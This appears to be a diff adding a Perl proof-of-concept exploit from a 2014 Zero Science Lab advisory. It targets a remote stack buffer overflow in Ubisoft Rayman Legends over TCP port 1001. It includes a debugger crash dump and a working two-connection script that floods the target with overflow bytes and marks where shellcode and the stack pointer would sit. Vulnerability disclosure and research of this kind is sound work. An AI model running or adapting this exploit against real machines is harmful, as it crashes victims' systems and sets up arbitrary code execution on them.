@@ -1,0 +1,123 @@
+#!/usr/bin/perl
+#
+#
+# Ubisoft Rayman Legends v1.2.103716 Remote Stack Buffer Overflow Vulnerability
+#
+#
+# Vendor: Ubisoft Entertainment S.A.
+# Product web page: http://www.ubi.com
+# Affected version: 1.2.103716, 1.1.100477 and 1.0.95278
+#
+# Summary: Rayman Legends is a 2013 platform game developed by Ubisoft
+# Montpellier and published by Ubisoft. It is the fifth main title in
+# the Rayman series and the direct sequel to the 2011 game Rayman Origins.
+# The game was released for Microsoft Windows, Xbox 360, PlayStation 3,
+# Wii U, and PlayStation Vita platforms in August and September 2013.
+# PlayStation 4 and Xbox One versions were released in February 2014.
+#
+# Desc: The vulnerability is caused due to a memset() boundary error in the
+# processing of incoming data thru raw socket connections on TCP port 1001,
+# which can be exploited to cause a stack based buffer overflow by sending a
+# long string of bytes on the second connection. Successful exploitation could
+# allow execution of arbitrary code on the affected node.
+#
+# ===========================================================================
+#
+# (15a8.f0c): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=aaaaaaaa ebx=096494a0 ecx=10909090 edx=00000002 esi=1c1bde90 edi=00000000
+# eip=715e26df esp=0f16dcec ebp=0f16dd14 iopl=0         nv up ei pl nz na pe cy
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207
+# MSVCR100!memset+0x5f:
+# 715e26df f3ab            rep stos dword ptr es:[edi]
+# 0:028> d esp
+# 0f16dcec  42 42 42 42 64 00 a6 00-00 00 00 00 aa 00 00 00  BBBBd...........
+# 0f16dcfc  42 42 42 42 42 42 42 42-22 00 00 00 50 42 4b 1c  BBBBBBBB"...PBK.
+# 0f16dd0c  90 43 0f 08 01 00 00 00-28 dd 16 0f 04 02 a6 00  .C......(.......
+# 0f16dd1c  50 42 4b 1c 6c dd 16 0f-d8 03 00 00 4c fd 16 0f  PBK.l.......L...
+# 0f16dd2c  e3 f9 a5 00 48 dd 16 0f-fc 03 00 00 3c 1d f7 07  ....H.......<...
+# 0f16dd3c  3c 1d f7 07 fb 14 db 75-fc 03 00 00 41 41 41 41  <......u....AAAA
+# 0f16dd4c  41 41 41 41 41 41 41 41-41 41 41 41 42 42 42 42  AAAAAAAAAAAABBBB
+# 0f16dd5c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+#
+# ===========================================================================
+#
+#
+# Tested on: Microsoft Windows 7 Professional SP1 (EN)
+#            Microsoft Windows 7 Ultimate SP1 (EN)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2014-5187
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5187.php
+#
+#
+# 22.05.2014
+# 
+#
+
+use IO::Socket;
+
+print
+ "
+ @****************************************@
+ |                                        |
+ | Ubisoft Rayman Legends BoF PoC Script  |
+ |                                        |
+ |              ZSL-2014-5187             |
+ |                                        |
+ @****************************************@
+ ";
+
+$ip="$ARGV[0]";
+
+if($#ARGV!=0)
+{
+   print "\n\n\x20\x20\x1c\x20Usage: $0 <ipaddr>\n\n";
+   exit();
+}
+
+print "\n\x20\x1c\x20Target: $ip\n";
+print "\x20\x1c\x20Initiating first connection\n";
+
+sleep 2;
+$conn1=IO::Socket::INET->new(PeerAddr=>$ip,PeerPort=>1001,Proto=>'tcp');
+if(!$conn1)
+{
+   print "\n\x20*** Connection error!\n";
+   exit();
+} else
+  {
+     print "\x20\x1c\x20Connection established\n";
+  }
+
+print $conn1 "\x44"x36;
+print $conn1 "\x45\x45\x45\x45";
+print $conn1 "\x46"x2000; # SC contain
+print "\x20\x1c\x20Payload sent\n";
+close $conn1;
+print "\x20\x1c\x20First stage completed\n\x20\x1c\n";
+print "\x20\x1c\x20Initiating second connection\n";
+
+sleep 2;
+$conn2=IO::Socket::INET->new(PeerAddr=>$ip,PeerPort=>1001,Proto=>'tcp');
+if(!$conn2)
+{
+   print "\n\x20*** Connection error!\n";
+   exit();
+} else
+  {
+     print "\x20\x1c\x20Connection established\n";
+  }
+
+print $conn2 "\x41" x 16;
+print $conn2 "\x42\x42\x42\x42"; # ESP ->
+print $conn2 "\x43"x1000; # SC contain
+print "\x20\x1c\x20Payload sent\n";
+print "\x20\x1c\x20Second stage completed\n";
+close $conn2;
+print "\x20\x1c\x20t00t!\n";
